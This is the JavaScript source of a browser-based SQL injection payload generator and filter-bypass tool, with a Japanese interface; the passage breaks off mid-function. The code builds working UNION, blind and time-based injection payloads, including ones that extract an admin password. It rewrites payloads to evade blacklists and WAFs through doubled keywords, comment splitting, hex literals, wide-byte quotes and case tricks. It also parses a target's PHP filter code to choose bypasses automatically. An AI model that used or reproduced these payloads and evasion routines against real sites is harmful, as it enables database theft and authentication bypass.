"use strict";

function PFX(v){ if(v==="") return "1"; if(v.startsWith("-1")) return v; return "1"+v; }

function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }

function urlEnc(s){ return encodeURIComponent(s); }

function hexLit(s){
  let o="0x";
  for(const ch of String(s)){
    const c=ch.codePointAt(0);
    if(c>255) return null;
    o+=c.toString(16).padStart(2,"0");
  }
  return o;
}

function unhex(h){ return (h.match(/../g)||[]).map(x=>String.fromCharCode(parseInt(x,16))).join(""); }

function doubleWrite(w){ const h=Math.ceil(w.length/2); return w.slice(0,h)+w+w.slice(h); }

function convertSubstrCommas(p){
  const names=["substr","substring","mid"];
  const lower=p.toLowerCase();
  let out="";
  let i=0;
  while(i<p.length){
    let hit=false;
    for(const nm of names){
      if(lower.startsWith(nm+"(",i)){
        let j=i+nm.length;
        let depth=0;
        let segStart=-1;
        const segs=[];
        let closed=false;
        for(;j<p.length;j++){
          const ch=p[j];
          if(ch==="("){ depth++; if(depth===1) segStart=j+1; }
          else if(ch===")"){
            depth--;
            if(depth===0){ segs.push(p.slice(segStart,j)); closed=true; j++; break; }
          }
          else if(ch===","&&depth===1){ segs.push(p.slice(segStart,j)); segStart=j+1; }
        }
        if(closed&&segs.length===3){
          out+=nm+"("+segs[0]+" from "+segs[1]+" for "+segs[2]+")";
          i=j;
          hit=true;
          break;
        }
      }
    }
    if(!hit){ out+=p[i]; i++; }
  }
  return out;
}

function randomCase(s){
  const out=new Array(s.length);
  let inS=false;
  for(let i=s.length-1;i>=0;i--){
    const c=s[i];
    if(c==="'"||c==='"'){ inS=!inS; out[i]=c; continue; }
    if(!inS&&(c==="x"||c==="X")&&s[i-1]==="0"){ out[i]=c; continue; }
    if(!inS&&/[a-zA-Z]/.test(c)) out[i]=Math.random()<0.5?c.toUpperCase():c.toLowerCase();
    else out[i]=c;
  }
  return out.join("");
}

function codeMask(s){
  const m=new Array(s.length);
  let inS=false;
  for(let i=s.length-1;i>=0;i--){
    const c=s[i];
    if(c==="'"||c==='"'){ inS=!inS; m[i]=false; }
    else m[i]=!inS;
  }
  return m;
}

function caseCap(s){
  const m=codeMask(s);
  const out=s.split("");
  for(let i=0;i<s.length;i++){
    const c=s[i];
    if(!m[i]||!/[a-zA-Z]/.test(c)) continue;
    if((c==="x"||c==="X")&&s[i-1]==="0") continue;
    const left=i>0&&/[a-zA-Z]/.test(s[i-1])&&m[i-1];
    out[i]=left?c.toLowerCase():c.toUpperCase();
  }
  return out.join("");
}

function altCase(s){
  const m=codeMask(s);
  const out=s.split("");
  let up=true;
  for(let i=0;i<s.length;i++){
    const c=s[i];
    if(!m[i]||!/[a-zA-Z]/.test(c)) continue;
    if((c==="x"||c==="X")&&s[i-1]==="0") continue;
    out[i]=up?c.toUpperCase():c.toLowerCase();
    up=!up;
  }
  return out.join("");
}

function maskedReplace(p,tok,replacement){
  const m=codeMask(p);
  const re=new RegExp(tok,"gi");
  let out="";
  let last=0;
  let mm;
  while((mm=re.exec(p))!==null){
    const idx=mm.index;
    if(m[idx]){
      out+=p.slice(last,idx)+replacement;
      last=idx+mm[0].length;
    }
    re.lastIndex=idx+mm[0].length;
  }
  out+=p.slice(last);
  return out;
}

function caseShift(s,dir){
  const out=new Array(s.length);
  let inS=false;
  for(let i=s.length-1;i>=0;i--){
    const c=s[i];
    if(c==="'"||c==='"'){ inS=!inS; out[i]=c; continue; }
    if(!inS&&(c==="x"||c==="X")&&s[i-1]==="0"){ out[i]=c; continue; }
    if(!inS&&/[a-zA-Z]/.test(c)) out[i]=dir==="lower"?c.toLowerCase():c.toUpperCase();
    else out[i]=c;
  }
  return out.join("");
}

function b64(s){ try{ return btoa(String.fromCharCode(...new TextEncoder().encode(s))); }catch(e){ return btoa(unescape(encodeURIComponent(s))); } }

function nullList(n,pos,expr){
  const a=[];
  for(let i=1;i<=n;i++) a.push(i===pos?(expr||"NULL"):"NULL");
  return a.join(",");
}

function wrapSub(t){
  if(/^\(\s*SELECT/i.test(t)) return t;
  return "(SELECT "+t+")";
}

function applyFilters(payload, active, mode, bans){
  bans=bans||new Set();
  const steps=[],warns=[],variants=[];
  const has=id=>active.has(id);
  const banHas=t=>bans.has(t);
  const inlineBlocked=has("inline")||banHas("/*")||banHas("/**/");
  let p=payload;

  const dashBanned=has("dash")||has("comment")||banHas("--");
  const hashBanned=has("hash")||has("comment")||banHas("#");

  if(dashBanned||hashBanned||has("inline")){
    const cm=p.match(/\s*(--\s*-|--|#|\/\*|;%00)\s*$/);
    if(cm){
      const tokRaw=cm[1];
      const tok=tokRaw.startsWith("--")?"--":(tokRaw==="#"?"#":(tokRaw.startsWith("/*")?"/*":"%00"));
      const bad=tok==="--"?dashBanned:(tok==="#"?hashBanned:(tok==="/*"?has("inline"):false));
      const body=p.slice(0,p.length-cm[0].length);
      if(bad){
        let alt="";
        if(tok==="--"&&!hashBanned) alt="#";
        else if(tok==="#"&&!dashBanned) alt="-- -";
        else if(!banHas(";")&&!banHas("%00")) alt=";%00";
        if(alt){
          p=body+alt;
          steps.push("行末の "+tok+" は禁止のため "+alt+" に置換");
        }else{
          p=body;
          steps.push("行末コメントを除去 (代替のコメント形式も禁止)");
          variants.push({t:"コメント無し 終端パターンA",p:body+" and '1'='1"});
          variants.push({t:"コメント無し 終端パターンB",p:body+" or ('1')=('1"});
          variants.push({t:"コメント無し 終端パターンC (Nullバイト)",p:body+";%00"});
          warns.push("コメント系トークンが全て禁止のため自分でクエリを閉じる必要あり (代替案参照)。%00 は古いPHP/APIでのみ有効。");
        }
      }else{
        steps.push("行末の "+tok+" コメントは禁止対象外のため保持");
      }
    }
  }

  const kwGuard=(w)=>{
    if(!has(w)) return;
    if(new RegExp(w,"i").test(p)){
      if(mode==="replace"){
        p=p.replace(new RegExp(w,"gi"),doubleWrite(w));
        steps.push("<b>"+w+"</b> を二重書き化: "+doubleWrite(w)+" (str_replaceが1パスなら削除後に元の語が復元される)");
      }else if(!has("inline")){
        const sp=w.slice(0,Math.ceil(w.length/2))+"/**/"+w.slice(Math.ceil(w.length/2));
        p=p.replace(new RegExp(w,"gi"),sp);
        steps.push("<b>"+w+"</b> をコメント分割化: "+sp);
      }else{
        warns.push("<b>"+w+"</b> が正規表現拒否 かつ /* */ も禁止 → UNION系は困難。ブール/時間盲注・エラー系に切り替えること。");
        variants.push({t:w+" 大文字小文字ランダム化 (正規表現が /i 無しの場合のみ有効)",p:p.replace(new RegExp(w,"gi"),m=>randomCase(m))});
      }
    }
  };
  kwGuard("union"); kwGuard("select");

  if(has("if")&&/\bif\s*\(/i.test(p)){
    const re=/\bif\s*\(([^(),]*(?:\([^()]*\)[^(),]*)*),([^(),]*(?:\([^()]*\)[^(),]*)*),([^(),]*(?:\([^()]*\)[^()]*)*)\)/gi;
    let changed=p.replace(re,(m,a,b,c)=>"(CASE WHEN "+a+" THEN "+b+" ELSE "+c+" END)");
    if(changed!==p){ p=changed; steps.push("IF(a,b,c) を CASE WHEN a THEN b ELSE c END に変換 (カンマ不要)"); }
    else warns.push("IF() にネストしたカンマがあり自動変換不能 → 手動で CASE WHEN に書き換えること。");
  }

  if(has("comma")){
    const before=p;
    if(!banHas("0x")){
      p=p.replace(/\b(char)\s*\(([\d,\s]+)\)/gi,(m,f,args)=>{
        const codes=args.split(",").map(x=>parseInt(x.trim(),10)).filter(x=>!isNaN(x));
        const s=String.fromCharCode(...codes);
        const h=hexLit(s);
        return h||m;
      });
      if(p!==before) steps.push("CHAR(97,100,...) を 16進リテラル 0x... に変換 (カンマ消滅)");
    }
    const subBefore=p;
    p=convertSubstrCommas(p);
    if(p!==subBefore) steps.push("SUBSTR(x,a,b) / MID を SUBSTR(x FROM a FOR b) 構文に変換 (カンマ不要)");
    p=p.replace(/\blimit\s+(\d+)\s*,\s*(\d+)/gi,(m,a,b)=>"limit "+b+" offset "+a);
    const ure=/union\s+select\s+((?:\d+|null)(?:\s*,\s*(?:\d+|null))*)\s*(--.*|#.*|\/\*.*)?$/i;
    const um=p.match(ure);
    if(um){
      const cols=um[1].split(",").map(x=>x.trim());
      if(cols.length>1){
        const parts=cols.map((c,i)=>"(select "+c+")x"+String.fromCharCode(97+i));
        p=p.replace(ure,"union select * from "+parts[0]+" join "+parts.slice(1).join(" join ")+(um[2]?" "+um[2]:""));
        steps.push("UNION SELECT 1,2,3,... を JOIN 形式に変換 (カンマ不要)");
      }
    }
    if(p!==before&&/,/.test(p)) warns.push("まだカンマが残っている (ネストした式等): 手動で FROM-FOR / OFFSET / 16進化 すること。");
  }

  if(has("eq")){
    const before=p;
    p=p.replace(/(?<![<>!=])=(?!=)/g," like ");
    if(p!==before) steps.push("= を LIKE に変換 (_ と % はワイルドカード扱いになる点に注意)");
  }

  if(has("andor")){
    const before=p;
    p=p.replace(/\band\b/gi,"&&").replace(/\bor\b/gi,"||");
    if(p!==before){ steps.push("and/or を && / || に変換 (URLでは %26%26 / %7C%7C)"); }
    if(/information_schema|order|for/i.test(p)) warns.push("注意: ブラックリストが /or/i の部分一致なら information_schema・order・for も拒否される。information_schema は mysql.innodb_table_stats 等へ置換、order by は group by 等へ。");
  }

  if(has("quote")){
    const before=p;
    if(banHas("0x")){
      warns.push("引用符と 0x の両方が禁止 → 16進リテラル不可。数値コンテキストを狙うか、カンマが使えるなら CHAR(...)、または対象の値を直接比較する形へ手動で再構成を。");
    }else{
      let outp="";
      let i=0;
      let fail=false;
      let conv=0;
      while(i<p.length){
        const ch=p[i];
        if(ch==="'"){
          const j=p.indexOf("'",i+1);
          if(j===-1){ outp+=ch; i++; continue; }
          const inner=p.slice(i+1,j);
          if(inner.length>0&&/\s/.test(inner)){ outp+=ch; i++; continue; }
          const h=inner===""?"0x":hexLit(inner);
          if(h===null){ fail=true; outp+=ch; i++; continue; }
          outp+=h; conv++; i=j+1; continue;
        }
        outp+=ch; i++;
      }
      p=outp;
      if(conv) steps.push("文字列リテラル 'abc' を 16進リテラル 0x616263 に変換 ("+conv+"個 / 引用符不要)");
      if(fail) warns.push("非ラテン1文字を含むリテラルは hex 化不能 (UTF-8 は1バイトずつ抜く方式で)。");
    }
    variants.push({t:"ワイドバイト (addslashes + GBK/Big5 環境)",p:payload.replace(/'/,"%bf%27")});
    warns.push("addslashes + マルチバイト文字コード (SET NAMES gbk 等) なら先頭に %bf%27 を付けるワイドバイトが有効。数値コンテキストなら引用符自体不要。");
  }

  if(has("number")){
    const masks=[];
    p=p.replace(/0x[0-9a-f]+/gi,m=>{ masks.push(m); return "\u0000M"+(masks.length-1)+"\u0000"; });
    let skipped=0;
    p=p.replace(/\b\d+\b/g,n=>{
      const v=parseInt(n,10);
      if(v===0) return "false";
      if(v>8){ skipped++; return n; }
      return Array(v).fill("true").join("+");
    });
    p=p.replace(/\u0000M(\d+)\u0000/g,(m,i)=>masks[parseInt(i,10)]);
    steps.push("数字を true 演算に変換 (1=true, 2=true+true) — MySQL専用の意味論");
    if(skipped>0) warns.push("大きすぎる数字 ("+skipped+"個) は true 和では書けない → benchmark の反復数を下げる等して小さくするか、文字列由来の値を使う。");
  }

  if(has("sleep")){
    if(/sleep\s*\(/i.test(p)){
      p=p.replace(/sleep\s*\(\s*\d+\s*\)/gi,"BENCHMARK(50000000,SHA1(0x41))");
      steps.push("SLEEP(n) を BENCHMARK(50000000,SHA1(0x41)) に変換 (MySQL)");
      variants.push({t:"重いクエリで遅延 (information_schema 直積)",p:"1' AND (SELECT count(*) FROM information_schema.tables A JOIN information_schema.tables B)-- -"});
    }
  }

  if(has("infoschema")){
    if(/information_schema\.tables/i.test(p)){
      p=p.replace(/information_schema\.tables/gi,"mysql.innodb_table_stats");
      steps.push("information_schema.tables を mysql.innodb_table_stats に変換 (MySQL 5.7+ / カラム名は取れない)");
      variants.push({t:"sys スキーマから (MySQL 5.7+, sysインストール済み)",p:"SELECT * FROM sys.schema_table_statistics"});
    }
    if(/information_schema\.columns/i.test(p)){
      warns.push("information_schema.columns の完全代替は無い → JOIN 自己結合の Duplicate column エラーでカラム名を暴くか、カラム名なし抽出 (チートシート参照)。");
    }
  }

  if(has("substr")&&/(substr|substring|mid)\s*\(/i.test(p)){
    warns.push("substr 系が拒否される → LIKE 'a%' / RLIKE '^a' / LEFT(x,1) で先頭一致盲注に切り替え (生成は ブラインド タブ)。");
    variants.push({t:"LIKE 前方一致 (substr 不要)",p:"1' AND (SELECT pw FROM users WHERE id='admin') LIKE 'a%'-- -"});
    variants.push({t:"RLIKE 正規表現アンカー",p:"1' AND (SELECT pw FROM users WHERE id='admin') RLIKE '^a'-- -"});
  }

  if(has("ascii")&&/(ascii|ord)\s*\(/i.test(p)){
    warns.push("ascii/ord が拒否される → HEX() 比較か直接文字比較 (LIKE/'a'=substr(...)) を使う。");
    variants.push({t:"HEX 比較 (ascii 不要)",p:"1' AND (SELECT HEX(SUBSTR(pw,1,1)) FROM users WHERE id='admin')=0x61-- -"});
  }

  if(has("paren")&&/[()]/.test(p)){
    warns.push("括弧が拒否される → 関数呼び出しは全て不可。LIKE 直接比較・ブール式のみが生きる (LOS umaru 型)。時間盲注は不可能。");
    variants.push({t:"括弧なし 直接比較",p:"1' and pw like 'a%'-- -"});
  }

  if(has("space")){
    const wsAlts=["%0a","%09","%0b","%0c","%0d","%a0"].filter(t=>!banHas(t));
    const cm=p.match(/\s*(--\s*-|--|#|\/\*|;%00)\s*$/);
    let tail="";
    let body=p;
    if(cm){ tail=cm[0]; body=p.slice(0,p.length-tail.length); }
    let pick="";
    if(!hashBanned&&!banHas("#")) pick="#";
    else if(!dashBanned&&!banHas("--")) pick="--"+(wsAlts[0]||"");
    else if(!banHas(";")&&!banHas("%00")) pick=";%00";
    tail=pick;
    if(!inlineBlocked){
      const before=body;
      body=body.replace(/\s+/g,"/**/");
      if(body!==before) steps.push("スペースを /**/ に変換");
    }else if(wsAlts.length){
      const sel=wsAlts[0];
      const before=body;
      body=body.replace(/\s+/g,sel);
      if(body!==before){ steps.push("スペースを "+sel+" に変換 (禁止済みの代替を除外し、利用可能なものを自動選択)"); }
      wsAlts.slice(1).forEach(t=>variants.push({t:"スペース→"+t,p:(body+tail).replace(new RegExp(sel.replace("%","\\%"),"g"),t)}));
    }else{
      warns.push("スペース代替 (%09 %0a %0b %0c %0d %a0) と /**/ が全て禁止 → 括弧グルーピング: 1'and(select(1)) の形式で組み立てること。");
    }
    p=body+tail;
    if(pick==="#") steps.push("末尾コメントは # を選択 (-- が禁止のため / MySQL)");
    else if(pick.startsWith("--")) steps.push("末尾コメントは --"+(wsAlts[0]||"")+" を選択 (# が禁止のため / -- の後続に空白相当が必要)");
    if(pick==="") warns.push("コメント系トークンが全て禁止 → 出力はクエリを自分で閉じる必要あり (代替案の終端パターン参照)。");
    if(pick==="#"&&!dashBanned&&!banHas("--")) variants.push({t:"コメント # を --%0a に (PG/MSSQL/SQLite用)",p:body.replace(/\s+/g,"/**/")+"--%0a"});
  }

  if(has("upper")||has("lower")||has("casecap")){
    const dir=has("upper")?"lower":"upper";
    const before=p;
    if(has("casecap")){
      p=caseCap(p);
      if(p!==before) steps.push("UNION/union の区別一致拒否を想定し先頭大文字化 (Union Select 形式 / 引用符内と 0x 接頭辞は保持)");
    }else{
      p=caseShift(p,dir);
      if(p!==before){
        steps.push(dir==="lower"
          ?"大文字が拒否されるため全トークンを小文字化 (引用符内と 0x 接頭辞は保持)"
          :"小文字が拒否されるため引用符外を大文字化 (SQLは大文字小文字不区別 / 文字列リテラルと 0x 接頭辞は保持)");
      }
    }
    if(has("upper")&&has("lower")) warns.push("大文字も小文字も拒否される → 文字クラス [A-Za-z] 拒否なら ASCII で書けないが、実際は 'UNION'/'union' の単語完全一致のケースが多い → casecap (Union) チップで先頭大文字化すれば通ることが多い。");
    if(dir==="upper"&&!has("casecap")) warns.push("大文字化の注意: DB側識別子の大文字小文字 (MySQL/Linuxのテーブル名は区別、Oracleディクショナリは大文字、PGの未クォート識別子は小文字) と、HEX() の出力が大文字である点に気をつける。");
  }

  for(const tok of bans){
    if(!tok) continue;
    const isAlpha=/^[a-z0-9_]+$/i.test(tok);
    if(isAlpha){
      if(!p.toLowerCase().includes(tok.toLowerCase())) continue;
      const applyMasked=repl=>{
        const np=maskedReplace(p,tok,repl);
        if(np!==p){ p=np; return true; }
        return false;
      };
      if(tok.length>=3&&mode==="replace"&&applyMasked(doubleWrite(tok))){
        steps.push("カスタム禁止語 <b>"+tok+"</b> を二重書き化: "+doubleWrite(tok));
        continue;
      }
      if(tok.length>=4&&!inlineBlocked&&!banHas("/*")){
        const h=Math.ceil(tok.length/2);
        const sp=tok.slice(0,h)+"/**/"+tok.slice(h);
        if(applyMasked(sp)){
          steps.push("カスタム禁止語 <b>"+tok+"</b> をコメント分割化: "+sp);
          continue;
        }
      }
      if(tok.length>=3){
        const pe=tok[0]+"%25"+tok.slice(1);
        if(applyMasked(pe)){
          steps.push("カスタム禁止語 <b>"+tok+"</b> を部分URLエンコード化: "+pe+" (サーバが再度デコードする場合のみ有効)");
          continue;
        }
      }
      warns.push("カスタム禁止トークン '"+tok+"' が引用符内リテラル等で残存 → 値そのものは書き換え不能。対象値の取得方法 (LIKE部分一致など) で手動回避を。");
    }else{
      if(p.includes(tok)) warns.push("カスタム禁止トークン '"+tok+"' がペイロードに残存 → 自動変換不能 (記号)。手動で回避すること。");
    }
  }

  const leftovers=[];
  if(has("space")&&/ /.test(p)) leftovers.push("スペース");
  if(has("comma")&&/,/.test(p)) leftovers.push("カンマ");
  if(has("quote")&&/'/.test(p)) leftovers.push("引用符");
  if(has("paren")&&/[()]/.test(p)) leftovers.push("括弧");
  if(has("eq")&&/(?<![<>!=])=(?!=)/.test(p)) leftovers.push("=");
  if(leftovers.length) warns.push("変換しきれていない文字が残存: "+leftovers.join(", ")+" → 手動調整が必要。");

  variants.push({t:"大文字小文字ランダム化 (WAF/正規表現が大小文字区別する場合)",p:randomCase(p)});
  variants.push({t:"先頭大文字化 Union Select (UNION/union 完全一致拒否の回避)",p:caseCap(p)});
  variants.push({t:"交互ケース UnIoN (同・区別一致の変奏)",p:altCase(p)});

  return {out:p,steps:steps,warns:warns,variants:variants};
}

function analyzeSource(src){
  const out=[];
  const chips=new Set();
  let mode=null;
  for(const az of ANALYZERS){
    const m=src.match(az.re);
    if(m){
      out.push({sev:az.sev,msg:az.msg,advice:az.advice,match:m[0].trim().slice(0,120)});
      az.chips.forEach(c=>chips.add(c));
    }
  }
  const pregRe=/preg_match(?:_all)?\s*\(\s*(['"])\/(.*?)\/([a-zA-Z]*)\1/g;
  let pm;
  while((pm=pregRe.exec(src))!==null){
    const pat=pm[2];
    const flags=pm[3]||"";
    mode=mode||"reject";
    out.push({sev:"warn",msg:"preg_match ブラックリスト検出: /"+pat+"/"+flags,advice:[],match:pm[0].slice(0,120)});
    if(flags.includes("i")) out.push({sev:"warn",msg:"  └ i フラグ付き → 大小文字混合 (SeLeCt) による回避は無効。コメント分割/二重書きで。",advice:[],match:""});
    else if(/union|select/i.test(pat)) out.push({sev:"ok",msg:"  └ i フラグなし = 大小文字区別の一致 → Union Select / UnIoN がそのまま通る (バイパス設定の UNION/union 一致拒否 チップ)",advice:[],match:""});
    const alts=pat.split("|");
    for(const alt of alts){
      const a=alt.replace(/\\([\s\S])/g,"$1").replace(/^\[|\]$/g,"");
      for(const pm2 of PREG_MAP){
        const kwRe=new RegExp(pm2.kw,"i");
        if(kwRe.test(a)){
          pm2.chips.forEach(c=>chips.add(c));
          if(pm2.note) out.push({sev:"ok",msg:"  └ "+a+" → チップ設定: "+pm2.chips.join(","),advice:[],match:""});
          break;
        }
      }
      if(/_/.test(a)&&!/information/i.test(a)) out.push({sev:"warn",msg:"  └ アンダースコア _ が拒否されている → information_schema のテーブル名が書けない (innodb_table_stats も不可)。カラム名なしからの抽出/盲注で。",advice:[],match:""});
      if(/\./.test(a)) out.push({sev:"warn",msg:"  └ ドット . が拒否されている → DB名.テーブル名 形式が書けない。",advice:[],match:""});
    }
  }
  const srRe=/str_replace\s*\(/g;
  let sr;
  while((sr=srRe.exec(src))!==null){
    const chunk=src.slice(sr.index,sr.index+300);
    const qs=chunk.match(/['"]([^'"]*)['"]/g)||[];
    const toks=qs.map(q=>q.slice(1,-1));
    const hit=toks.filter(t=>t.length>0&&t.length<40);
    if(hit.length){
      mode="replace";
      out.push({sev:"warn",msg:"str_replace 削除検出: "+hit.map(t=>JSON.stringify(t)).join(", ").slice(0,100),advice:["str_replace は1パス処理 → 二重書き (selselectect) が有効。モードを str_replace 型に自動設定した。"],match:chunk.slice(0,120)});
      for(const t of hit){
        for(const pm3 of PREG_MAP){
          if(new RegExp("^"+pm3.kw+"$","i").test(t)){ pm3.chips.forEach(c=>chips.add(c)); break; }
        }
        if(t===" ") chips.add("space");
        if(t===",") chips.add("comma");
        if(t==="=") chips.add("eq");
        if(t==="("||t===")") chips.add("paren");
      }
    }
  }
  return {items:out,chips:[...chips],mode:mode};
}

if(typeof document!=="undefined"){

let state={urlenc:{}};
const active=new Set();
let customBans=new Set();

function parseCustomBans(){
  const raw=($("bp-custom")||{value:""}).value||"";
  const toks=raw.split(/[\n,、]+/).map(t=>t.trim()).filter(t=>t.length>0);
  customBans=new Set(toks.map(t=>/^[a-z0-9_\[\]-]+$/i.test(t)?t.toLowerCase():t));
  let added=[];
  for(const t of customBans){
    const m=BAN_TO_CHIP.find(x=>x.t===t);
    if(m) m.chips.forEach(c=>{ if(!active.has(c)){ active.add(c); added.push(c); } });
  }
  renderChips();
  refreshAll();
  if(added.length) toast("カスタム禁止から "+[...new Set(added)].length+" 個のチップを自動設定");
}

function $(id){ return document.getElementById(id); }

function toast(msg){
  let t=$("toast");
  if(!t){ t=document.createElement("div"); t.id="toast"; t.className="toast"; t.setAttribute("role","status"); t.setAttribute("aria-live","polite"); document.body.appendChild(t); }
  t.textContent=msg;
  t.classList.add("show");
  clearTimeout(t._to);
  t._to=setTimeout(()=>t.classList.remove("show"),1400);
}

function copyText(s,label){
  const done=()=>toast((label||"コピー")+"しました");
  if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(s).then(done,()=>fallbackCopy(s,done)); }
  else fallbackCopy(s,done);
}
function fallbackCopy(s,done){
  const ta=document.createElement("textarea");
  ta.value=s; document.body.appendChild(ta); ta.select();
  try{ document.execCommand("copy"); done(); }catch(e){ toast("コピー失敗"); }
  document.body.removeChild(ta);
}

function btnRow(payload,raw){
  const e=urlEnc(payload);
  const r=raw===undefined?payload:raw;
  return '<div class="btnrow">'
    +'<button type="button" class="btn tiny" onclick="SQLIFORGE.cp(this)" data-v="'+esc(payload)+'">コピー</button>'
    +'<button type="button" class="btn tiny" onclick="SQLIFORGE.cp(this)" data-v="'+esc(e)+'">URLエンコード版</button>'
    +'<button type="button" class="btn tiny" onclick="SQLIFORGE.toBypass(this)" data-v="'+esc(r)+'">→ラボで調整</button>'
    +'</div>';
}

const DBCLS={"MySQL / MariaDB":"db-mysql","PostgreSQL":"db-pg","SQLite":"db-sqlite","MSSQL (SQL Server)":"db-mssql","Oracle":"db-oracle"};

function fx(raw){
  if(!active.size&&!customBans.size) return {final:raw,changed:false,steps:[],warns:[]};
  const mode=$("bp-mode").value;
  const steps=[],warns=[];
  const final=String(raw).split("\n").map(ln=>{
    const r=applyFilters(ln,active,mode,customBans);
    r.steps.forEach(s=>{ if(!steps.includes(s)) steps.push(s); });
    r.warns.forEach(w=>{ if(!warns.includes(w)) warns.push(w); });
    return r.out;
  }).join("\n");
  return {final:final,changed:final!==raw,steps:steps,warns:warns};
}

let _cardEnc=false;

function cardHTML(item,withButtons){
  const raw=item.p instanceof Array?item.p.join("\n"):item.p;
  const t=fx(raw);
  const disp=_cardEnc?urlEnc(t.final):t.final;
  const dbc=item.db?(DBCLS[item.db]||""):"";
  let det="";
  if(t.changed){
    det='<details class="fxdet"><summary>変換ログ・生ペイロード ('+t.steps.length+'件)</summary>'
      +'<div class="payload dim">'+esc(raw)+'</div>'
      +t.steps.map(s=>'<div class="step">✔ '+s+'</div>').join("")
      +t.warns.map(w=>'<div class="step warn">⚠ '+w+'</div>').join("")
      +'</details>';
  }
  return '<div class="card">'
    +'<div class="card-title">'+esc(item.t)+(t.changed?' <span class="badge auto">自動バイパス済</span>':"")+(item.hard?' <span class="badge hard">上級</span>':"")+(item.db?' <span class="badge db '+dbc+'">'+esc(item.db)+'</span>':"")+'</div>'
    +'<div class="payload">'+esc(disp)+'</div>'
    +(withButtons===false?"":btnRow(disp,raw))
    +det
    +(item.n?'<div class="card-note'+(item.warn||item.hard?" warn":"")+'">'+item.n+'</div>':"")
    +'</div>';
}

function renderCards(id,items,enc){ _cardEnc=!!enc; $(id).innerHTML=items.map(c=>cardHTML(c)).join(""); }

function fillSelect(id,arr,def){
  const el=$(id);
  el.innerHTML=arr.map(o=>'<option value="'+esc(o.v)+'"'+(o.v===def?" selected":"")+'>'+esc(o.label||o.v)+'</option>').join("");
}
function fillDbms(id,def){ fillSelect(id,Object.keys(DB).map(k=>({v:k,label:DB[k].name})),def||"mysql"); }

function switchTab(name){
  document.querySelectorAll("#tabs .tab").forEach(b=>{
    const on=b.dataset.tab===name;
    b.classList.toggle("active",on);
    b.setAttribute("aria-selected",on?"true":"false");
    b.tabIndex=on?0:-1;
  });
  document.querySelectorAll(".panel").forEach(p=>{
    const on=p.id==="tab-"+name;
    p.classList.toggle("active",on);
    p.setAttribute("tabindex",on?"0":"-1");
  });
}

function initTabs(){
  const tabs=[...document.querySelectorAll("#tabs .tab")];
  tabs.forEach(b=>b.addEventListener("click",()=>switchTab(b.dataset.tab)));
  const first=tabs.find(b=>b.classList.contains("active"))||tabs[0];
  if(first) switchTab(first.dataset.tab);
  document.addEventListener("keydown",e=>{
    const idx=tabs.indexOf(document.activeElement);
    if(idx<0) return;
    let j=null;
    if(e.key==="ArrowRight"||e.key==="ArrowDown") j=(idx+1)%tabs.length;
    else if(e.key==="ArrowLeft"||e.key==="ArrowUp") j=(idx-1+tabs.length)%tabs.length;
    else if(e.key==="Home") j=0;
    else if(e.key==="End") j=tabs.length-1;
    if(j===null) return;
    e.preventDefault();
    tabs[j].focus();
    switchTab(tabs[j].dataset.tab);
  });
}

function renderDetect(){
  renderCards("detect-cards",DETECT.map(d=>({t:d.t,p:d.p,n:d.n})),$("det-urlenc").checked);
}

function tblHTML(headers,rows){
  return '<table><tr>'+headers.map(h=>'<th>'+esc(h)+'</th>').join('')+'</tr>'
    +rows.map(r=>'<tr>'+r.map((c,i)=>'<td'+(i===0?' class="mono"':'')+'>'+c+'</td>').join('')+'</tr>').join('')+'</table>';
}

function renderDetectStatic(){
  $("fingerprint").innerHTML=tblHTML(["式 / 挙動","判定 DBMS","備考"],FINGERPRINT.map(f=>['<code>'+esc(f.q)+'</code>',esc(f.d),esc(f.n)]));
  const crows=[
    ["-- - / --", "MySQL / PG / MSSQL / SQLite / Oracle", "MySQL では -- の後に空白等が要る (だから -- - が定番)"],
    ["#", "MySQL のみ", "# が通れば MySQL 確定"],
    ["/* ... */", "全DBMS", "文末なら閉じなくてもOK"],
    [";%00", "PHP + 一部DB", "Nullバイト切り詰め"]
  ];
  $("comments-tbl").innerHTML=tblHTML(["コメント","対応","備考"],crows);
  renderCards("authbypass-cards",AUTHBYPASS.map(d=>({t:d.t,p:d.p,n:d.n,warn:d.warn})),$("det-urlenc").checked);
}

function unBuild(){
  const db=DB[$("un-dbms").value];
  const n=Math.max(1,Math.min(40,parseInt($("un-cols").value||"4",10)));
  const echo=Math.max(1,Math.min(n,parseInt($("un-echo").value||"2",10)));
  const P=PFX($("un-prefix").value);
  const C=$("un-comment").value;
  const enc=$("un-urlenc").checked;
  const dual=db.needsDual?" FROM dual":"";

  const cc=[];
  const maxc=n+3;
  const seq=[]; for(let i=1;i<=maxc;i++) seq.push(i);
  cc.push({t:"ORDER BY 総当たり (i=1.."+maxc+")",p:seq.map(i=>P+" ORDER BY "+i+(C?" "+C:"")).join("\n"),n:"エラーになる直前の数 = カラム数。MySQL は Unknown column '4' と教えてくれる。"});
  cc.push({t:"UNION NULL 総当たり",p:seq.map(i=>P+" UNION SELECT "+nullList(i,1,"NULL")+(db.needsDual?" FROM dual":"")+(C?" "+C:"")).join("\n"),n:"列数が合うまでエラー → 合った瞬間に成功。NULL は全DBMS/全型で矛盾しない。"});
  cc.push({t:"ORDER BY 一発確認 (エラー表示あり)",p:P+" ORDER BY "+seq.join(",")+(C?" "+C:""),n:"Unknown column 'N' の N-1 が列数 (MySQL)。"});
  renderCards("un-colcount",cc,enc);

  const ef=[];
  for(let i=1;i<=n;i++){
    ef.push({t:"表示列テスト: "+i+" 列目",p:P+" UNION SELECT "+nullList(n,i,"'zz"+i+"'")+dual+(C?" "+C:""),n:"画面に zz"+i+" と出たら、その位置がデータを出せる列。"});
  }
  renderCards("un-echofind",ef,enc);

  const info=[];
  info.push({t:"一括情報 (version|db|user)",p:P+" UNION SELECT "+nullList(n,echo,db.info)+dual+(C?" "+C:""),n:db.name});
  info.push({t:"version",p:P+" UNION SELECT "+nullList(n,echo,db.version)+dual+(C?" "+C:"")});
  info.push({t:"database",p:P+" UNION SELECT "+nullList(n,echo,db.db)+dual+(C?" "+C:"")});
  info.push({t:"user",p:P+" UNION SELECT "+nullList(n,echo,db.user)+dual+(C?" "+C:"")});
  renderCards("un-info",info,enc);

  renderCards("un-multirow",[
    {t:"複数行: 1行ずつ取り出し (MySQL)",db:"MySQL",p:P+" UNION SELECT "+nullList(n,echo,"(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)")+(C?" "+C:""),n:db.multirowNote},
